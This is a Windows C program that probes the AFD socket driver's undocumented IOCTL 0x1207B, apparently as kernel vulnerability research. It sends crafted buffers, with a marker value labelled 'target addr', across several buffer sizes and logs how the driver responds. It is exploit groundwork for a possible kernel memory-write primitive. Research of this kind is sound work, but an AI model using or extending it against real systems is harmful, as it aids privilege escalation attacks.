#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <winternl.h>

#pragma comment(lib, "ws2_32.lib")

static HANDLE hLog;
static void Log(const char *msg) {
    DWORD n; WriteFile(hLog, msg, (DWORD)strlen(msg), &n, NULL);
    WriteFile(hLog, "\r\n", 2, &n, NULL);
}

typedef NTSTATUS (NTAPI *pNtDIC)(HANDLE, HANDLE, PVOID, PVOID, IO_STATUS_BLOCK*, ULONG, PVOID, ULONG, PVOID, ULONG);

int main() {
    char buf[512];
    hLog = CreateFileA("C:\\Users\\ross\\Desktop\\afd_sock_test3.log", GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (!hLog || hLog == INVALID_HANDLE_VALUE) return 1;
    
    HMODULE ntdll = GetModuleHandleA("ntdll");
    pNtDIC NtDIC = (pNtDIC)GetProcAddress(ntdll, "NtDeviceIoControlFile");
    if (!NtDIC) { Log("NtDIC fail"); CloseHandle(hLog); return 1; }
    
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) { Log("WSA fail"); CloseHandle(hLog); return 1; }
    Log("[start] OK");
    
    HANDLE hIocp = CreateIoCompletionPort(INVALID_HANDLE_VALUE, NULL, 0, 0);
    SOCKET s = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, WSA_FLAG_OVERLAPPED);
    CreateIoCompletionPort((HANDLE)s, hIocp, (ULONG_PTR)s, 0);
    
    // Try exact 0xC8 byte buffer for 0x1207B
    Log("--- 0x1207B with 0xC8 buffer ---");
    {
        char big[0xC8];
        memset(big, 0, sizeof(big));
        *(HANDLE*)(big + 0x00) = hIocp;               // hIocp
        
        // Allocate buffers
        void *ri = VirtualAlloc(NULL, 0x1000, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
        void *ce = VirtualAlloc(NULL, 0x1000, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
        *(void**)(big + 0x08) = ri;                     // regInfos
        *(void**)(big + 0x10) = ce;                     // compEntries
        *(ULONGLONG*)(big + 0x18) = 0x4141414141414141; // recvCount (target addr)
        *(DWORD*)(big + 0x20) = 1;                       // regCount
        *(DWORD*)(big + 0x24) = 0x1000;                  // timeout
        *(DWORD*)(big + 0x28) = 8;                       // compCount
        
        char out[0x200] = {0};
        IO_STATUS_BLOCK ios = {0};
        NTSTATUS st = NtDIC((HANDLE)s, NULL, NULL, NULL, &ios, 0x1207B, big, sizeof(big), out, sizeof(out));
        sprintf(buf, "[0x1207B][0xC8] st=0x%08lx ios=0x%08lx", st, ios.Status); Log(buf);
        
        // Hexdump output
        int printed = 0;
        for (int i = 0; i < 0x40; i++) {
            if (out[i]) { 
                if (!printed) { sprintf(buf, "  out:"); printed = 1; }
                char t[32]; sprintf(t, " [%d]=0x%02x", i, (BYTE)out[i]); strcat(buf, t);
            }
        }
        if (printed) Log(buf); else Log("  out: all zeros");
        
        VirtualFree(ri, 0, MEM_RELEASE);
        VirtualFree(ce, 0, MEM_RELEASE);
    }
    
    // Try with varied sizes around 0xC8
    ULONG sizes[] = { 0xC8, 0xD0, 0x100, 0x120, 0x140, 0x160, 0x180, 0x1A0, 0x200, 0x300, 0x400 };
    for (int si = 0; si < sizeof(sizes)/sizeof(ULONG); si++) {
        char *big = (char*)VirtualAlloc(NULL, sizes[si], MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
        if (!big) continue;
        
        // Fill with known pattern
        memset(big, 0xAA, sizes[si]);
        
        // Set key fields
        *(HANDLE*)(big + 0x00) = hIocp;
        void *ri = VirtualAlloc(NULL, 0x1000, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
        void *ce = VirtualAlloc(NULL, 0x1000, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
        *(void**)(big + 0x08) = ri;
        *(void**)(big + 0x10) = ce;
        *(ULONGLONG*)(big + 0x18) = 0x4242424242424242;
        *(DWORD*)(big + 0x20) = 1;
        *(DWORD*)(big + 0x24) = 0x1000;
        *(DWORD*)(big + 0x28) = 8;
        
        char out[0x400] = {0};
        IO_STATUS_BLOCK ios = {0};
        NTSTATUS st = NtDIC((HANDLE)s, NULL, NULL, NULL, &ios, 0x1207B, big, sizes[si], out, sizeof(out));
        sprintf(buf, "[0x1207B][sz=0x%02lx] st=0x%08lx", sizes[si], st); Log(buf);
        
        // Check output for changed bytes
        int changed = 0;
        for (int i = 0; i < 0x30 && i < (int)sizes[si]; i++) {
            if (big[i] != 0xAA) {
                if (!changed) { sprintf(buf, "  in-modified:"); changed = 1; }
                char t[32]; sprintf(t, " [%d]=0x%02x->0x%02x", i, 0xAA, (BYTE)big[i]); strcat(buf, t);
            }
        }
        if (changed) Log(buf); else Log("  in: all 0xAA");
        
        VirtualFree(big, 0, MEM_RELEASE);
        VirtualFree(ri, 0, MEM_RELEASE);
        VirtualFree(ce, 0, MEM_RELEASE);
    }
    
    closesocket(s);
    CloseHandle(hIocp);
    
    // Also test whether IOCP needs to be seeded with completion entries
    Log("--- 0x1207B with no IOCP seeding ---");
    {
        HANDLE hI2 = CreateIoCompletionPort(INVALID_HANDLE_VALUE, NULL, 0, 0);
        SOCKET s2 = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, WSA_FLAG_OVERLAPPED);
        CreateIoCompletionPort((HANDLE)s2, hI2, (ULONG_PTR)s2, 0);
        
        char big[0xC8];
        memset(big, 0, sizeof(big));
        *(HANDLE*)(big + 0x00) = hI2;
        void *ri = VirtualAlloc(NULL, 0x1000, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
        void *ce = VirtualAlloc(NULL, 0x1000, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
        *(void**)(big + 0x08) = ri;
        *(void**)(big + 0x10) = ce;
        *(ULONGLONG*)(big + 0x18) = 0x4343434343434343;
        *(DWORD*)(big + 0x20) = 1;
        *(DWORD*)(big + 0x24) = 0x1000;
        *(DWORD*)(big + 0x28) = 0;  // compCount = 0
        
        char out[0x200] = {0};
        IO_STATUS_BLOCK ios = {0};
        NTSTATUS st = NtDIC((HANDLE)s2, NULL, NULL, NULL, &ios, 0x1207B, big, sizeof(big), out, sizeof(out));
        sprintf(buf, "[0x1207B][compCount=0] st=0x%08lx", st); Log(buf);
        
        // Try seeding
        for (int i = 0; i < 5; i++) PostQueuedCompletionStatus(hI2, 0x41, 0x1337, NULL);
        *(DWORD*)(big + 0x28) = 5;
        memset(&ios, 0, sizeof(ios));
        st = NtDIC((HANDLE)s2, NULL, NULL, NULL, &ios, 0x1207B, big, sizeof(big), out, sizeof(out));
        sprintf(buf, "[0x1207B][compCount=5,seeded] st=0x%08lx", st); Log(buf);
        
        VirtualFree(ri, 0, MEM_RELEASE);
        VirtualFree(ce, 0, MEM_RELEASE);
        closesocket(s2);
        CloseHandle(hI2);
    }
    
    Log("[end]");
    WSACleanup();
    CloseHandle(hLog);
    return 0;
}
